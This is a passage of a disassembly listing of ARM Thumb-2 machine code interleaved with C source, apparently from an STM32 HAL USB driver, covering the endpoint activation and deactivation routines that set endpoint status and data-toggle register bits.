 80065dc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065e0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065e4:	877b      	strh	r3, [r7, #58]	; 0x3a
 80065e6:	687a      	ldr	r2, [r7, #4]
 80065e8:	683b      	ldr	r3, [r7, #0]
 80065ea:	781b      	ldrb	r3, [r3, #0]
 80065ec:	009b      	lsls	r3, r3, #2
 80065ee:	441a      	add	r2, r3
 80065f0:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 80065f2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065f6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065fa:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065fe:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006602:	b29b      	uxth	r3, r3
 8006604:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8006606:	687a      	ldr	r2, [r7, #4]
 8006608:	683b      	ldr	r3, [r7, #0]
 800660a:	781b      	ldrb	r3, [r3, #0]
 800660c:	009b      	lsls	r3, r3, #2
 800660e:	4413      	add	r3, r2
 8006610:	881b      	ldrh	r3, [r3, #0]
 8006612:	b29b      	uxth	r3, r3
 8006614:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006618:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800661c:	873b      	strh	r3, [r7, #56]	; 0x38
 800661e:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006620:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006624:	873b      	strh	r3, [r7, #56]	; 0x38
 8006626:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006628:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800662c:	873b      	strh	r3, [r7, #56]	; 0x38
 800662e:	687a      	ldr	r2, [r7, #4]
 8006630:	683b      	ldr	r3, [r7, #0]
 8006632:	781b      	ldrb	r3, [r3, #0]
 8006634:	009b      	lsls	r3, r3, #2
 8006636:	441a      	add	r2, r3
 8006638:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 800663a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800663e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006642:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006646:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800664a:	b29b      	uxth	r3, r3
 800664c:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800664e:	687a      	ldr	r2, [r7, #4]
 8006650:	683b      	ldr	r3, [r7, #0]
 8006652:	781b      	ldrb	r3, [r3, #0]
 8006654:	009b      	lsls	r3, r3, #2
 8006656:	4413      	add	r3, r2
 8006658:	881b      	ldrh	r3, [r3, #0]
 800665a:	b29b      	uxth	r3, r3
 800665c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006660:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006664:	86fb      	strh	r3, [r7, #54]	; 0x36
 8006666:	687a      	ldr	r2, [r7, #4]
 8006668:	683b      	ldr	r3, [r7, #0]
 800666a:	781b      	ldrb	r3, [r3, #0]
 800666c:	009b      	lsls	r3, r3, #2
 800666e:	441a      	add	r2, r3
 8006670:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 8006672:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006676:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800667a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800667e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006682:	b29b      	uxth	r3, r3
 8006684:	8013      	strh	r3, [r2, #0]
 8006686:	e0bc      	b.n	8006802 <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006688:	687a      	ldr	r2, [r7, #4]
 800668a:	683b      	ldr	r3, [r7, #0]
 800668c:	781b      	ldrb	r3, [r3, #0]
 800668e:	009b      	lsls	r3, r3, #2
 8006690:	4413      	add	r3, r2
 8006692:	881b      	ldrh	r3, [r3, #0]
 8006694:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8006698:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 800669c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80066a0:	2b00      	cmp	r3, #0
 80066a2:	d01d      	beq.n	80066e0 <USB_ActivateEndpoint+0x654>
 80066a4:	687a      	ldr	r2, [r7, #4]
 80066a6:	683b      	ldr	r3, [r7, #0]
 80066a8:	781b      	ldrb	r3, [r3, #0]
 80066aa:	009b      	lsls	r3, r3, #2
 80066ac:	4413      	add	r3, r2
 80066ae:	881b      	ldrh	r3, [r3, #0]
 80066b0:	b29b      	uxth	r3, r3
 80066b2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066b6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066ba:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 80066be:	687a      	ldr	r2, [r7, #4]
 80066c0:	683b      	ldr	r3, [r7, #0]
 80066c2:	781b      	ldrb	r3, [r3, #0]
 80066c4:	009b      	lsls	r3, r3, #2
 80066c6:	441a      	add	r2, r3
 80066c8:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 80066cc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066d0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066d4:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80066d8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066dc:	b29b      	uxth	r3, r3
 80066de:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80066e0:	687a      	ldr	r2, [r7, #4]
 80066e2:	683b      	ldr	r3, [r7, #0]
 80066e4:	781b      	ldrb	r3, [r3, #0]
 80066e6:	009b      	lsls	r3, r3, #2
 80066e8:	4413      	add	r3, r2
 80066ea:	881b      	ldrh	r3, [r3, #0]
 80066ec:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 80066f0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80066f4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80066f8:	2b00      	cmp	r3, #0
 80066fa:	d01d      	beq.n	8006738 <USB_ActivateEndpoint+0x6ac>
 80066fc:	687a      	ldr	r2, [r7, #4]
 80066fe:	683b      	ldr	r3, [r7, #0]
 8006700:	781b      	ldrb	r3, [r3, #0]
 8006702:	009b      	lsls	r3, r3, #2
 8006704:	4413      	add	r3, r2
 8006706:	881b      	ldrh	r3, [r3, #0]
 8006708:	b29b      	uxth	r3, r3
 800670a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800670e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006712:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8006716:	687a      	ldr	r2, [r7, #4]
 8006718:	683b      	ldr	r3, [r7, #0]
 800671a:	781b      	ldrb	r3, [r3, #0]
 800671c:	009b      	lsls	r3, r3, #2
 800671e:	441a      	add	r2, r3
 8006720:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 8006724:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006728:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800672c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006730:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006734:	b29b      	uxth	r3, r3
 8006736:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006738:	683b      	ldr	r3, [r7, #0]
 800673a:	78db      	ldrb	r3, [r3, #3]
 800673c:	2b01      	cmp	r3, #1
 800673e:	d024      	beq.n	800678a <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006740:	687a      	ldr	r2, [r7, #4]
 8006742:	683b      	ldr	r3, [r7, #0]
 8006744:	781b      	ldrb	r3, [r3, #0]
 8006746:	009b      	lsls	r3, r3, #2
 8006748:	4413      	add	r3, r2
 800674a:	881b      	ldrh	r3, [r3, #0]
 800674c:	b29b      	uxth	r3, r3
 800674e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006752:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006756:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 800675a:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 800675e:	f083 0320 	eor.w	r3, r3, #32
 8006762:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006766:	687a      	ldr	r2, [r7, #4]
 8006768:	683b      	ldr	r3, [r7, #0]
 800676a:	781b      	ldrb	r3, [r3, #0]
 800676c:	009b      	lsls	r3, r3, #2
 800676e:	441a      	add	r2, r3
 8006770:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006774:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006778:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800677c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006780:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006784:	b29b      	uxth	r3, r3
 8006786:	8013      	strh	r3, [r2, #0]
 8006788:	e01d      	b.n	80067c6 <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800678a:	687a      	ldr	r2, [r7, #4]
 800678c:	683b      	ldr	r3, [r7, #0]
 800678e:	781b      	ldrb	r3, [r3, #0]
 8006790:	009b      	lsls	r3, r3, #2
 8006792:	4413      	add	r3, r2
 8006794:	881b      	ldrh	r3, [r3, #0]
 8006796:	b29b      	uxth	r3, r3
 8006798:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800679c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80067a0:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 80067a4:	687a      	ldr	r2, [r7, #4]
 80067a6:	683b      	ldr	r3, [r7, #0]
 80067a8:	781b      	ldrb	r3, [r3, #0]
 80067aa:	009b      	lsls	r3, r3, #2
 80067ac:	441a      	add	r2, r3
 80067ae:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 80067b2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067b6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067ba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067be:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067c2:	b29b      	uxth	r3, r3
 80067c4:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80067c6:	687a      	ldr	r2, [r7, #4]
 80067c8:	683b      	ldr	r3, [r7, #0]
 80067ca:	781b      	ldrb	r3, [r3, #0]
 80067cc:	009b      	lsls	r3, r3, #2
 80067ce:	4413      	add	r3, r2
 80067d0:	881b      	ldrh	r3, [r3, #0]
 80067d2:	b29b      	uxth	r3, r3
 80067d4:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80067d8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067dc:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 80067e0:	687a      	ldr	r2, [r7, #4]
 80067e2:	683b      	ldr	r3, [r7, #0]
 80067e4:	781b      	ldrb	r3, [r3, #0]
 80067e6:	009b      	lsls	r3, r3, #2
 80067e8:	441a      	add	r2, r3
 80067ea:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 80067ee:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067f2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067f6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067fa:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067fe:	b29b      	uxth	r3, r3
 8006800:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 8006802:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 8006806:	4618      	mov	r0, r3
 8006808:	3774      	adds	r7, #116	; 0x74
 800680a:	46bd      	mov	sp, r7
 800680c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006810:	4770      	bx	lr
 8006812:	bf00      	nop

08006814 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006814:	b480      	push	{r7}
 8006816:	b08d      	sub	sp, #52	; 0x34
 8006818:	af00      	add	r7, sp, #0
 800681a:	6078      	str	r0, [r7, #4]
 800681c:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 800681e:	683b      	ldr	r3, [r7, #0]
 8006820:	7b1b      	ldrb	r3, [r3, #12]
 8006822:	2b00      	cmp	r3, #0
 8006824:	f040 808e 	bne.w	8006944 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 8006828:	683b      	ldr	r3, [r7, #0]
 800682a:	785b      	ldrb	r3, [r3, #1]
 800682c:	2b00      	cmp	r3, #0
 800682e:	d044      	beq.n	80068ba <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006830:	687a      	ldr	r2, [r7, #4]
 8006832:	683b      	ldr	r3, [r7, #0]
 8006834:	781b      	ldrb	r3, [r3, #0]
 8006836:	009b      	lsls	r3, r3, #2
 8006838:	4413      	add	r3, r2
 800683a:	881b      	ldrh	r3, [r3, #0]
 800683c:	81bb      	strh	r3, [r7, #12]
 800683e:	89bb      	ldrh	r3, [r7, #12]
 8006840:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006844:	2b00      	cmp	r3, #0
 8006846:	d01b      	beq.n	8006880 <USB_DeactivateEndpoint+0x6c>
 8006848:	687a      	ldr	r2, [r7, #4]
 800684a:	683b      	ldr	r3, [r7, #0]
 800684c:	781b      	ldrb	r3, [r3, #0]
 800684e:	009b      	lsls	r3, r3, #2
 8006850:	4413      	add	r3, r2
 8006852:	881b      	ldrh	r3, [r3, #0]
 8006854:	b29b      	uxth	r3, r3
 8006856:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800685a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800685e:	817b      	strh	r3, [r7, #10]
 8006860:	687a      	ldr	r2, [r7, #4]
 8006862:	683b      	ldr	r3, [r7, #0]
 8006864:	781b      	ldrb	r3, [r3, #0]
 8006866:	009b      	lsls	r3, r3, #2
 8006868:	441a      	add	r2, r3
 800686a:	897b      	ldrh	r3, [r7, #10]
 800686c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006870:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006874:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006878:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800687c:	b29b      	uxth	r3, r3
 800687e:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006880:	687a      	ldr	r2, [r7, #4]
 8006882:	683b      	ldr	r3, [r7, #0]
 8006884:	781b      	ldrb	r3, [r3, #0]
 8006886:	009b      	lsls	r3, r3, #2
 8006888:	4413      	add	r3, r2
 800688a:	881b      	ldrh	r3, [r3, #0]
 800688c:	b29b      	uxth	r3, r3
 800688e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006892:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006896:	813b      	strh	r3, [r7, #8]
 8006898:	687a      	ldr	r2, [r7, #4]
 800689a:	683b      	ldr	r3, [r7, #0]
 800689c:	781b      	ldrb	r3, [r3, #0]
 800689e:	009b      	lsls	r3, r3, #2
 80068a0:	441a      	add	r2, r3
 80068a2:	893b      	ldrh	r3, [r7, #8]
 80068a4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068a8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068ac:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068b0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068b4:	b29b      	uxth	r3, r3
 80068b6:	8013      	strh	r3, [r2, #0]
 80068b8:	e192      	b.n	8006be0 <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80068ba:	687a      	ldr	r2, [r7, #4]
 80068bc:	683b      	ldr	r3, [r7, #0]
 80068be:	781b      	ldrb	r3, [r3, #0]
 80068c0:	009b      	lsls	r3, r3, #2
 80068c2:	4413      	add	r3, r2
 80068c4:	881b      	ldrh	r3, [r3, #0]
 80068c6:	827b      	strh	r3, [r7, #18]
 80068c8:	8a7b      	ldrh	r3, [r7, #18]
 80068ca:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80068ce:	2b00      	cmp	r3, #0
 80068d0:	d01b      	beq.n	800690a <USB_DeactivateEndpoint+0xf6>
 80068d2:	687a      	ldr	r2, [r7, #4]
 80068d4:	683b      	ldr	r3, [r7, #0]
 80068d6:	781b      	ldrb	r3, [r3, #0]
 80068d8:	009b      	lsls	r3, r3, #2
 80068da:	4413      	add	r3, r2
 80068dc:	881b      	ldrh	r3, [r3, #0]
 80068de:	b29b      	uxth	r3, r3
 80068e0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068e4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068e8:	823b      	strh	r3, [r7, #16]
 80068ea:	687a      	ldr	r2, [r7, #4]
 80068ec:	683b      	ldr	r3, [r7, #0]
 80068ee:	781b      	ldrb	r3, [r3, #0]
 80068f0:	009b      	lsls	r3, r3, #2
 80068f2:	441a      	add	r2, r3
 80068f4:	8a3b      	ldrh	r3, [r7, #16]
 80068f6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068fa:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068fe:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006902:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006906:	b29b      	uxth	r3, r3
 8006908:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 800690a:	687a      	ldr	r2, [r7, #4]
 800690c:	683b      	ldr	r3, [r7, #0]
 800690e:	781b      	ldrb	r3, [r3, #0]
 8006910:	009b      	lsls	r3, r3, #2
 8006912:	4413      	add	r3, r2
 8006914:	881b      	ldrh	r3, [r3, #0]
 8006916:	b29b      	uxth	r3, r3
 8006918:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800691c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006920:	81fb      	strh	r3, [r7, #14]
 8006922:	687a      	ldr	r2, [r7, #4]
 8006924:	683b      	ldr	r3, [r7, #0]
 8006926:	781b      	ldrb	r3, [r3, #0]
 8006928:	009b      	lsls	r3, r3, #2
 800692a:	441a      	add	r2, r3
 800692c:	89fb      	ldrh	r3, [r7, #14]
 800692e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006932:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006936:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800693a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800693e:	b29b      	uxth	r3, r3
 8006940:	8013      	strh	r3, [r2, #0]
 8006942:	e14d      	b.n	8006be0 <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 8006944:	683b      	ldr	r3, [r7, #0]
 8006946:	785b      	ldrb	r3, [r3, #1]
 8006948:	2b00      	cmp	r3, #0
 800694a:	f040 80a5 	bne.w	8006a98 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800694e:	687a      	ldr	r2, [r7, #4]
 8006950:	683b      	ldr	r3, [r7, #0]
 8006952:	781b      	ldrb	r3, [r3, #0]
 8006954:	009b      	lsls	r3, r3, #2
 8006956:	4413      	add	r3, r2
 8006958:	881b      	ldrh	r3, [r3, #0]
 800695a:	843b      	strh	r3, [r7, #32]
 800695c:	8c3b      	ldrh	r3, [r7, #32]
 800695e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006962:	2b00      	cmp	r3, #0
 8006964:	d01b      	beq.n	800699e <USB_DeactivateEndpoint+0x18a>
 8006966:	687a      	ldr	r2, [r7, #4]
 8006968:	683b      	ldr	r3, [r7, #0]
 800696a:	781b      	ldrb	r3, [r3, #0]
 800696c:	009b      	lsls	r3, r3, #2
 800696e:	4413      	add	r3, r2
 8006970:	881b      	ldrh	r3, [r3, #0]
 8006972:	b29b      	uxth	r3, r3
 8006974:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006978:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800697c:	83fb      	strh	r3, [r7, #30]
 800697e:	687a      	ldr	r2, [r7, #4]
 8006980:	683b      	ldr	r3, [r7, #0]
 8006982:	781b      	ldrb	r3, [r3, #0]
 8006984:	009b      	lsls	r3, r3, #2
 8006986:	441a      	add	r2, r3
 8006988:	8bfb      	ldrh	r3, [r7, #30]
 800698a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800698e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006992:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006996:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800699a:	b29b      	uxth	r3, r3
 800699c:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800699e:	687a      	ldr	r2, [r7, #4]
 80069a0:	683b      	ldr	r3, [r7, #0]
 80069a2:	781b      	ldrb	r3, [r3, #0]
 80069a4:	009b      	lsls	r3, r3, #2
 80069a6:	4413      	add	r3, r2
 80069a8:	881b      	ldrh	r3, [r3, #0]
 80069aa:	83bb      	strh	r3, [r7, #28]
 80069ac:	8bbb      	ldrh	r3, [r7, #28]
 80069ae:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80069b2:	2b00      	cmp	r3, #0
 80069b4:	d01b      	beq.n	80069ee <USB_DeactivateEndpoint+0x1da>
 80069b6:	687a      	ldr	r2, [r7, #4]
 80069b8:	683b      	ldr	r3, [r7, #0]
 80069ba:	781b      	ldrb	r3, [r3, #0]
 80069bc:	009b      	lsls	r3, r3, #2
 80069be:	4413      	add	r3, r2
 80069c0:	881b      	ldrh	r3, [r3, #0]
 80069c2:	b29b      	uxth	r3, r3
 80069c4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069c8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069cc:	837b      	strh	r3, [r7, #26]
 80069ce:	687a      	ldr	r2, [r7, #4]
 80069d0:	683b      	ldr	r3, [r7, #0]
 80069d2:	781b      	ldrb	r3, [r3, #0]
 80069d4:	009b      	lsls	r3, r3, #2
 80069d6:	441a      	add	r2, r3
 80069d8:	8b7b      	ldrh	r3, [r7, #26]
 80069da:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069de:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069e2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069e6:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80069ea:	b29b      	uxth	r3, r3
 80069ec:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 80069ee:	687a      	ldr	r2, [r7, #4]
 80069f0:	683b      	ldr	r3, [r7, #0]
 80069f2:	781b      	ldrb	r3, [r3, #0]
 80069f4:	009b      	lsls	r3, r3, #2
 80069f6:	4413      	add	r3, r2
 80069f8:	881b      	ldrh	r3, [r3, #0]
 80069fa:	b29b      	uxth	r3, r3
 80069fc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a00:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a04:	833b      	strh	r3, [r7, #24]
 8006a06:	687a      	ldr	r2, [r7, #4]
 8006a08:	683b      	ldr	r3, [r7, #0]
 8006a0a:	781b      	ldrb	r3, [r3, #0]
 8006a0c:	009b      	lsls	r3, r3, #2
 8006a0e:	441a      	add	r2, r3
 8006a10:	8b3b      	ldrh	r3, [r7, #24]
 8006a12:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a16:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a1a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a1e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006a22:	b29b      	uxth	r3, r3
 8006a24:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006a26:	687a      	ldr	r2, [r7, #4]
 8006a28:	683b      	ldr	r3, [r7, #0]
 8006a2a:	781b      	ldrb	r3, [r3, #0]
 8006a2c:	009b      	lsls	r3, r3, #2
 8006a2e:	4413      	add	r3, r2
 8006a30:	881b      	ldrh	r3, [r3, #0]
 8006a32:	b29b      	uxth	r3, r3
 8006a34:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006a38:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a3c:	82fb      	strh	r3, [r7, #22]
 8006a3e:	687a      	ldr	r2, [r7, #4]
 8006a40:	683b      	ldr	r3, [r7, #0]
 8006a42:	781b      	ldrb	r3, [r3, #0]
 8006a44:	009b      	lsls	r3, r3, #2
 8006a46:	441a      	add	r2, r3
 8006a48:	8afb      	ldrh	r3, [r7, #22]
 8006a4a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a4e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a52:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a56:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a5a:	b29b      	uxth	r3, r3
 8006a5c:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006a5e:	687a      	ldr	r2, [r7, #4]
 8006a60:	683b      	ldr	r3, [r7, #0]
 8006a62:	781b      	ldrb	r3, [r3, #0]
 8006a64:	009b      	lsls	r3, r3, #2
 8006a66:	4413      	add	r3, r2
 8006a68:	881b      	ldrh	r3, [r3, #0]
 8006a6a:	b29b      	uxth	r3, r3
 8006a6c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a70:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006a74:	82bb      	strh	r3, [r7, #20]
 8006a76:	687a      	ldr	r2, [r7, #4]
 8006a78:	683b      	ldr	r3, [r7, #0]
 8006a7a:	781b      	ldrb	r3, [r3, #0]
 8006a7c:	009b      	lsls	r3, r3, #2
 8006a7e:	441a      	add	r2, r3
 8006a80:	8abb      	ldrh	r3, [r7, #20]
 8006a82:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a86:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a8a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a8e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a92:	b29b      	uxth	r3, r3
 8006a94:	8013      	strh	r3, [r2, #0]
 8006a96:	e0a3      	b.n	8006be0 <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006a98:	687a      	ldr	r2, [r7, #4]
 8006a9a:	683b      	ldr	r3, [r7, #0]
 8006a9c:	781b      	ldrb	r3, [r3, #0]
 8006a9e:	009b      	lsls	r3, r3, #2
 8006aa0:	4413      	add	r3, r2
 8006aa2:	881b      	ldrh	r3, [r3, #0]
 8006aa4:	85fb      	strh	r3, [r7, #46]	; 0x2e
 8006aa6:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 8006aa8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006aac:	2b00      	cmp	r3, #0
 8006aae:	d01b      	beq.n	8006ae8 <USB_DeactivateEndpoint+0x2d4>
 8006ab0:	687a      	ldr	r2, [r7, #4]
 8006ab2:	683b      	ldr	r3, [r7, #0]
 8006ab4:	781b      	ldrb	r3, [r3, #0]
 8006ab6:	009b      	lsls	r3, r3, #2
 8006ab8:	4413      	add	r3, r2
 8006aba:	881b      	ldrh	r3, [r3, #0]
 8006abc:	b29b      	uxth	r3, r3
 8006abe:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006ac2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
